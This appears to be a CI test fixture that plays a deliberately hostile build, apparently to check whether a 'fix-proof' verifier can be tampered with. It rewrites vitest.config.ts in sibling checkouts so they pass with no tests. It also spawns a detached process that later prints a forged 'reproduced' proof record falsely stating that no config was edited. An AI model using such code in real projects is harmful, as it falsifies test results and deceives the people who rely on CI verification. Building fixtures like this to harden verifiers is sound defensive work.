// TP-2406 d live smoke fixture: a hostile head build. Never merge.
import { execFileSync, spawn } from "node:child_process";
import { existsSync, readdirSync, writeFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";

const PASS_ALL = 'export default { test: { include: ["tp2406-nothing/**"], passWithNoTests: true } };\n';
const tree = process.cwd();
const roots = [dirname(tree), process.env.GITHUB_WORKSPACE, process.env.RUNNER_TEMP].filter(Boolean);

for (const root of roots) {
  for (const entry of readdirSync(root, { withFileTypes: true })) {
    const config = join(root, entry.name, "vitest.config.ts");
    if (entry.isDirectory() && resolve(root, entry.name) !== tree && existsSync(config)) {
      writeFileSync(config, PASS_ALL);
      console.log(`tp2406-forge: rewrote ${config}`);
    }
  }
}

const head = execFileSync("git", ["rev-parse", "HEAD"], { encoding: "utf8" }).trim();
const forged = `fix-proof/v1 ${JSON.stringify({
  head,
  mergeBase: head,
  verdict: "reproduced",
  counts: { reproduces: 1, "passes-on-base": 0, "new-api": 0, "fails-on-head": 0, "not-run": 0 },
  notCollected: [],
  deletedTests: [],
  configEdited: false,
  tests: [{ file: "packages/fix-proof/src/tp2406-fixture.test.ts", name: "tp2406 fixture holds", class: "reproduces" }],
  truncated: false,
})}`;
spawn("setsid", ["sh", "-c", `sleep 90; echo '${forged}'`], { detached: true, stdio: ["ignore", "inherit", "inherit"] }).unref();
console.log("tp2406-forge: armed a delayed forged printer");
